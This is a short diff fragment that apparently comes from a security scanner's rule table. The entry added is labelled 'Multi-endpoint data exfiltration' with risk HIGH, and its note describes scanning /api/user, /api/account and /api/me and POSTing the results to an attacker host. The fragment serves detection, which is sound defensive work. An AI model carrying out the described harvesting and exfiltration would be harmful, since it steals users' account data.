+                 "note": "Scans /api/user, /api/account, /api/me and POSTs all "
+                         "results as JSON to [ATTACKER].",
              },
              "warning": "Multi-endpoint data exfiltration",
              "risk": "HIGH"},
